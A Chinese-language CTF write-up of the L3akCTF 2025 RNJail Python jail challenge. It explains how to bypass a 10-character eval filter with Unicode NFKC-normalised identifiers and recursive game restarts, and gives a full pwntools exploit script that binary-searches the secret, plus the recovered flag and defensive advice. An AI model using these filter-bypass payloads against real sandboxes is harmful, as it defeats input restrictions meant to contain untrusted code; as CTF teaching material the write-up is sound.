# L3akCTF 2025 RNJail Writeup

## 题目简述

服务端随机生成 1024 字节并转换成一个 8192 位左右的大整数，选手只有两次猜测机会：

```python
game = RNJail(2, bytes_to_long(get_random_bytes(1024)))
```

每次输入会经过三层限制：

- 长度不能超过 10 个 Python 字符；
- 不得包含任何内置函数名；
- 禁止 `[,;"'`]` 等字符；
- `eval` 的 `__builtins__` 被清空。

程序仍把 `RNJail.__init__` 的 `locals()` 直接保存为全局命名空间，其中包含当前对象 `rnjail`。如果能在 10 字符内调用 `rnjail.startRnj()`，就能递归启动一轮新的“两次猜测”，把有限次数扩展为足以二分搜索的比较 oracle。核心漏洞是 Python 标识符的 Unicode NFKC 规范化，因此本题属于语言 jail 逃逸，归入 pwn。

## 解题过程

### 找到持久化对象引用

初始化代码为：

```python
rnjail.SAFE_GLOBALS = locals()
rnjail.SAFE_GLOBALS["__builtins__"] = {}
del rnjail.SAFE_GLOBALS["intendedTargetValue"]
```

虽然目标值已从字典删除，但 `locals()` 中的 `rnjail` 仍指向游戏对象，而且多次 `eval` 共用同一个字典。赋值表达式创建的变量会跨猜测保留。

直接写 `{z:=rnjail}` 有 12 个字符，超过上限。Python 在词法分析标识符时会执行 NFKC 规范化，而字符 `ǌ` 会规范化成 `nj`，所以：

```python
{z:=rǌail}
```

原始长度刚好为 10，解析后等价于：

```python
{z:=rnjail}
```

花括号用于构造集合，使 walrus 表达式能合法出现在顶层；即使集合不能转成整数，变量 `z` 的赋值已经写入共享命名空间。

### 在 10 字符内重新启动游戏

连字字符 `ﬅ` 会被 NFKC 规范化成 `st`，配合 `ǌ` 后：

```python
z.ﬅartRǌ()
```

原始长度同样为 10，解析结果则是：

```python
z.startRnj()
```

第一次游戏的两次输入分别用于保存 `z` 和递归调用。新调用再次提供两个输入；此后 `z` 已持久化，每一层只需发送一次短调用就能继续向下递归。

### 用有界深度构造大量叶节点

若始终线性递归，约两百多层后就会触及 Python 调用栈限制。正确做法是只递归到约 15 层：

- 到达叶节点后，用一个输入提交实际猜测或更新变量；
- 叶节点耗尽两次输入并返回父层；
- 父层尚未使用的第二个输入可以再次递归，形成另一棵子树；
- 深度 15 的二叉调用树可提供约 $2^{15}$ 个叶节点，而实际栈深度始终只有 15 左右。

官方脚本约需 24500 次交互，足以恢复 8192 位目标。

### 构造大整数二分搜索

输入长度只有 10，因此不能直接发送 8192 位十进制数。脚本使用共享变量保存候选值，并用短 walrus 表达式更新：

```python
{a:=256}
{c:=a}
{d:=c*4}
{a:=a<<d}
{a:=a>>c}
{b:=a>>1}
{a:=a+b}
{a:=a-b}
{b:=b>>1}
```

服务的三种响应分别构成比较 oracle：

```text
you gotta think bigger...   -> 猜测值小于目标
i can't count that high...  -> 猜测值大于目标
i guess you've earned...    -> 猜测值等于目标
```

先用大步长移位确定数量级，再逐级缩小步长；得到一个覆盖目标的二进制区间后，以 `b` 为当前步长，根据比较结果令 `a += b` 或 `a -= b`，并不断执行 `b >>= 1`，最终命中随机整数。

下面是与官方实现等价的完整交互脚本：

```python
import sys

from pwn import remote

sys.set_int_max_str_digits(9_999_999)

io = remote("challenge.example", 5000)
recursion_level = 0
guess_num = 0


def recv_until_guess():
    global recursion_level

    data = io.recv()
    try:
        if b":" not in data:
            data += io.recvuntil(b":")
        data += io.recv(timeout=0.05)
    except EOFError:
        pass

    recursion_level -= data.count(b"better luck next time")
    if b"#1" in data:
        return 1, data
    if b"#2" in data:
        return 2, data
    return 0, data


def init_recurse():
    io.sendline("{z:=rǌail}".encode())
    recv_until_guess()
    io.sendline("z.ﬅartRǌ()".encode())
    recv_until_guess()


def recurse_level():
    global recursion_level
    recursion_level += 1
    io.sendline("z.ﬅartRǌ()".encode())
    recv_until_guess()


def prepare_send():
    while recursion_level < 15:
        recurse_level()


def check_value():
    global guess_num

    guess_num += 1
    prepare_send()
    io.sendline(b"a")
    _, data = recv_until_guess()
    print(f"guess {guess_num}: {eval('a')}")

    if b"earned" in data:
        return 2, data
    if b"count" in data:
        return 0, data
    return 1, data


def send(expression):
    global guess_num

    guess_num += 1
    eval(expression, globals())
    prepare_send()
    io.sendline(expression.encode())
    recv_until_guess()


init_recurse()
send("{a:=256}")
send("{c:=a}")
send("{d:=c*4}")
result, output = check_value()

while result == 1:
    send("{a:=a<<d}")
    result, output = check_value()

while result == 0:
    send("{a:=a>>c}")
    result, output = check_value()

while result == 1:
    send("{a:=a<<8}")
    result, output = check_value()

while result == 0:
    send("{a:=a>>1}")
    result, output = check_value()

send("{b:=a>>1}")
result, output = check_value()

while True:
    if result == 1:
        send("{a:=a+b}")
    elif result == 0:
        send("{a:=a-b}")
    else:
        print(output.decode())
        break

    send("{b:=b>>1}")
    result, output = check_value()
```

命中目标后，服务端读取的 flag 为：

```text
L3AK{a_b1n4ry_s3arch_1n_3v3ry_m34ning_0f_th3_w0rd_bu7_jus7_in_c4se_y0u_f0und_4_ch33s3_im_g0nn4_mak3_th3_fl4g_1024_byt3s_too_c900e43f79bc26fa6cc3fdddcbb00ff4d3c5a187a1c1419b8e9f8e2e6c9550d84702e6b587e5dd5d5dea0abef7e84841af50194337d39671c318d01b2cbe5435668d77031ed143bf8db9b5fb409ba2741140ad3c5dec6a8ca64b64ff3004bc7294bb3ec38b47ad1f1767dad5686ad86cbd6c731ba0bcc7e799d97b812394142709f78611c1f21f6b4eff36bd37c12c45c21046e6ffab5db422760cb21cdff5d95016d978d4d07a8e09e66e1c57048b5c5b627e86e963d2b941813be2f49edfa4f6d25f9591e3a2e850eba954c82a33f2e66d5d874fb63827fbc4f331c9a517dbc64991306432e57b21da1307c7dff1ccaf3608fb8df59e90156ec46ca6a43fe51b766c1ce645118e38d3d7f459e4102cd733a2dac02086893eb963548e069f8d0797f347dc9ebfd722848c7f82eba98979345422560b347b8e18366d2286ca8b0370ebce000ce985823e0405ad1d4a1097dc666186ff9d55d37d65eaefd1f4f5e690015a04e676eed3c399cdb9d0b91931c45ab7cdaa316bc6956e270e6c4fe082098eb96944ed0147ac61246e30cb2d1564e70ddc7367e1a134e97344da51b2cf2b8d0d3765adc93dce702f97afb136da53dcde2b16b4192f389f8b2151f3028f}
```

## 方法总结

本题把三个看似独立的小问题串成了完整利用链：共享 `eval` 命名空间泄露对象引用，Unicode NFKC 规范化绕过字符长度限制，递归调用再把两次机会放大成比较查询树。任何一项单独存在都未必足以完成攻击，但组合后即可对 8192 位随机数执行二分搜索。

设计语言 jail 时，长度检查必须基于解释器实际采用的规范化结果，且不应把敏感对象放入可复用的求值命名空间。交互次数限制也不能只依赖可被用户重入的方法调用；应把配额放在不可递归重置的外层会话状态中。
